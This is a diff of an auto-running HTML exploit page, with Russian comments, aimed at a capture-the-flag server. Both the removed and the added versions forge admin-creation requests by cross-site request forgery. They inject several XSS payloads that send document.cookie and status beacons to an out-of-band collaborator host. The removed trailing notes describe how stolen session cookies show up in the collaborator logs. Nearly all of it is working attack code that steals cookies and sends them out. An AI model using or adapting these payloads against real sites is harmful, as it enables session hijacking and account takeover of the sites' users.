@@ -2,283 +2,81 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Totally Legit Page</title>
+    <title>Exploit</title>
 </head>
 <body>
-    <h1>Cool Stuff Here!</h1>
+    <h1>Loading...</h1>
 
     <script>
-        // ==============================================
-        // КОНФИГУРАЦИЯ
-        // ==============================================
-        const COLLABORATOR = 'zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
-        const TARGET_URL = 'http://tasks.goidactf.ru:20168'; // УКАЖИ ПОРТ
+        const COLLAB = 'zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+        const TARGET = 'http://tasks.goidactf.ru:20168';
         
         const timestamp = Date.now();
-        const randomPart = Math.random().toString(36).substring(2, 8);
-        const newAdminLogin = `pwned_${timestamp}_${randomPart}`;
+        const login = `pwned${timestamp}`;
 
         // ==============================================
-        // ЭКСФИЛЬТРАЦИЯ
+        // XSS PAYLOAD ДЛЯ КРАЖИ COOKIE
         // ==============================================
-        function exfil(data) {
-            const params = new URLSearchParams(data).toString();
-            new Image().src = `https://${COLLABORATOR}/exfil?${params}`;
-        }
+        
+        // Payload 1: Простой fetch
+        const payload1 = `x<script>fetch('https://${COLLAB}/c1?c='+document.cookie)</script>`;
+        
+        // Payload 2: Image beacon
+        const payload2 = `x<img src=x onerror="this.src='https://${COLLAB}/c2?c='+document.cookie">`;
+        
+        // Payload 3: Через форму
+        const payload3 = `x<body onload="fetch('https://${COLLAB}/c3?c='+document.cookie)">`;
+        
+        // Payload 4: Meta refresh с cookie в URL
+        const payload4 = `x<script>location='https://${COLLAB}/c4?c='+document.cookie</script>`;
+        
+        // Payload 5: XMLHttpRequest
+        const payload5 = `x<script>var x=new XMLHttpRequest();x.open('GET','https://${COLLAB}/c5?c='+document.cookie);x.send()</script>`;
 
         // ==============================================
-        // МЕТОД 1: УКРАСТЬ COOKIE ЧЕРЕЗ IFRAME (если нет HttpOnly)
+        // ОТПРАВКА PAYLOADS
         // ==============================================
-        function tryStealCookieViaIframe() {
-            console.log('[*] Method 1: Cookie theft via iframe');
-            
-            // Создаём iframe на том же домене для доступа к cookies
-            const iframe = document.createElement('iframe');
-            iframe.src = `${TARGET_URL}/admin`; // Любая страница того же домена
-            iframe.style.display = 'none';
-            iframe.name = 'cookie_stealer';
-            document.body.appendChild(iframe);
-            
-            // После создания админа, пытаемся прочитать cookie из iframe
-            setTimeout(() => {
-                try {
-                    const cookies = iframe.contentDocument.cookie;
-                    if (cookies) {
-                        exfil({
-                            method: 'iframe_cookie_theft',
-                            cookies: cookies,
-                            login: newAdminLogin
-                        });
-                    }
-                } catch(e) {
-                    console.log('Cookie theft blocked:', e);
-                }
-            }, 2000);
-        }
-
-        // ==============================================
-        // МЕТОД 2: ЗАСТАВИТЬ БОТА ОТПРАВИТЬ COOKIE НА НАШ СЕРВЕР
-        // ==============================================
-        function forceExfilCookie() {
-            console.log('[*] Method 2: Force cookie exfiltration');
-            
-            // Создаём форму которая сабмитится на наш collaborator
+        function sendPayload(payload, id) {
             const form = document.createElement('form');
             form.method = 'POST';
-            form.action = `https://${COLLABORATOR}/cookie_receiver`;
-            form.target = 'exfil_frame';
-            
-            // Пытаемся добавить cookie через JavaScript (если можем)
-            const cookieInput = document.createElement('input');
-            cookieInput.type = 'hidden';
-            cookieInput.name = 'stolen_cookie';
-            cookieInput.value = document.cookie; // Это не сработает для HttpOnly
-            form.appendChild(cookieInput);
-            
-            const loginInput = document.createElement('input');
-            loginInput.type = 'hidden';
-            loginInput.name = 'admin_login';
-            loginInput.value = newAdminLogin;
-            form.appendChild(loginInput);
-            
-            const iframe = document.createElement('iframe');
-            iframe.name = 'exfil_frame';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            document.body.appendChild(form);
-            form.submit();
-        }
-
-        // ==============================================
-        // МЕТОД 3: XSS + COOKIE THEFT (если есть XSS)
-        // ==============================================
-        function tryXSSCookieTheft() {
-            console.log('[*] Method 3: XSS-based cookie theft');
-            
-            // Пытаемся создать админа с XSS payload в логине
-            const xssPayload = `<img src=x onerror="fetch('https://${COLLABORATOR}/xss?c='+document.cookie)">`;
-            
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = `${TARGET_URL}/create_admin`;
-            form.target = '_blank';
+            form.action = `${TARGET}/create_admin`;
+            form.target = `frame_${id}`;
             
             const input = document.createElement('input');
             input.name = 'new_admin_login';
-            input.value = xssPayload;
-            form.appendChild(input);
-            
-            document.body.appendChild(form);
-            form.submit();
-        }
-
-        // ==============================================
-        // МЕТОД 4: ЗАСТАВИТЬ БОТА ЗАЙТИ НА НАШ СЕРВЕР С COOKIES
-        // ==============================================
-        function redirectBotToOurServer() {
-            console.log('[*] Method 4: Redirect bot to collaborator');
-            
-            // После создания админа, редиректим бота на наш сервер
-            // Бот пришлёт Referer header с cookies (возможно)
-            setTimeout(() => {
-                // Создаём iframe который редиректит
-                const iframe = document.createElement('iframe');
-                iframe.src = `${TARGET_URL}/admin`;
-                iframe.style.display = 'none';
-                iframe.name = 'redirect_frame';
-                
-                iframe.onload = function() {
-                    // Пытаемся сделать редирект из iframe
-                    try {
-                        iframe.contentWindow.location.href = `https://${COLLABORATOR}/bot_visited`;
-                    } catch(e) {
-                        console.log('Redirect blocked');
-                    }
-                };
-                
-                document.body.appendChild(iframe);
-            }, 2000);
-        }
-
-        // ==============================================
-        // МЕТОД 5: СОЗДАТЬ FETCH REQUEST С CREDENTIALS
-        // ==============================================
-        async function tryFetchWithCredentials() {
-            console.log('[*] Method 5: Fetch with credentials include');
-            
-            // Делаем fetch запрос который включает cookies
-            try {
-                const response = await fetch(`${TARGET_URL}/admin`, {
-                    method: 'GET',
-                    credentials: 'include',
-                    mode: 'no-cors'
-                });
-                
-                // Не можем прочитать ответ из-за CORS, но можем узнать что запрос прошёл
-                exfil({
-                    method: 'fetch_sent',
-                    login: newAdminLogin,
-                    note: 'Request sent with credentials'
-                });
-            } catch(e) {
-                exfil({
-                    method: 'fetch_failed',
-                    error: e.message
-                });
-            }
-        }
-
-        // ==============================================
-        // МЕТОД 6: IFRAME С CREDENTIALS + LOCATION CHANGE
-        // ==============================================
-        function tryIframeLocationLeak() {
-            console.log('[*] Method 6: Iframe location leak');
-            
-            const iframe = document.createElement('iframe');
-            iframe.src = `${TARGET_URL}/admin`;
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            // Пытаемся прочитать location после загрузки
-            iframe.onload = function() {
-                setTimeout(() => {
-                    try {
-                        // Если есть редирект, location изменится
-                        const location = iframe.contentWindow.location.href;
-                        exfil({
-                            method: 'iframe_location',
-                            location: location,
-                            login: newAdminLogin
-                        });
-                    } catch(e) {
-                        exfil({
-                            method: 'iframe_location_blocked',
-                            login: newAdminLogin
-                        });
-                    }
-                }, 1000);
-            };
-        }
-
-        // ==============================================
-        // ГЛАВНЫЙ ЭКСПЛОЙТ
-        // ==============================================
-        async function mainExploit() {
-            console.log('[*] Starting cookie theft exploit');
-            
-            // ШАГ 1: Создаём админа через CSRF
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = `${TARGET_URL}/create_admin`;
-            form.target = 'csrf_iframe';
-            
-            const input = document.createElement('input');
-            input.name = 'new_admin_login';
-            input.value = newAdminLogin;
+            input.value = payload;
             form.appendChild(input);
             
             const iframe = document.createElement('iframe');
-            iframe.name = 'csrf_iframe';
+            iframe.name = `frame_${id}`;
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
             
             document.body.appendChild(form);
             form.submit();
             
-            // Отправляем начальный сигнал
-            exfil({
-                status: 'csrf_sent',
-                login: newAdminLogin,
-                timestamp: new Date().toISOString()
-            });
-            
-            // ШАГ 2: Пытаемся украсть cookie разными способами
-            setTimeout(() => tryStealCookieViaIframe(), 1000);
-            setTimeout(() => forceExfilCookie(), 1500);
-            setTimeout(() => tryXSSCookieTheft(), 2000);
-            setTimeout(() => redirectBotToOurServer(), 2500);
-            setTimeout(() => tryFetchWithCredentials(), 3000);
-            setTimeout(() => tryIframeLocationLeak(), 3500);
-            
-            // ШАГ 3: Финальная эксфильтрация
-            setTimeout(() => {
-                exfil({
-                    status: 'complete',
-                    admin_login: newAdminLogin,
-                    note: 'Check all exfil methods above'
-                });
-            }, 5000);
+            console.log(`[*] Sent payload ${id}:`, payload);
         }
 
-        // Запуск
+        // ==============================================
+        // ЗАПУСК ВСЕХ PAYLOADS
+        // ==============================================
+        function exploit() {
+            // Отправляем все варианты с задержкой
+            sendPayload(payload1, 1);
+            setTimeout(() => sendPayload(payload2, 2), 500);
+            setTimeout(() => sendPayload(payload3, 3), 1000);
+            setTimeout(() => sendPayload(payload4, 4), 1500);
+            setTimeout(() => sendPayload(payload5, 5), 2000);
+            
+            // Отправляем уведомление о старте
+            fetch(`https://${COLLAB}/started?t=${timestamp}`, {mode: 'no-cors'});
+        }
+
+        // Автозапуск
         window.addEventListener('load', () => {
-            setTimeout(mainExploit, 500);
+            setTimeout(exploit, 300);
         });
     </script>
 </body>
 </html>
-```
-
----
-
-## 🎯 **ЧТО ИЩЕМ В COLLABORATOR:**
-
-1. **HTTP запросы с cookies:**
-```
-Cookie: session=eyJhbGciOi...
-```
-
-2. **POST данные с украденными cookies:**
-```
-stolen_cookie=session=eyJhbGciOi...
-```
-
-3. **XSS callback:**
-```
-/xss?c=session=eyJhbGciOi...
-```
-
-4. **Referer с данными:**
-```
-Referer: http://tasks.goidactf.ru:XXXX/admin
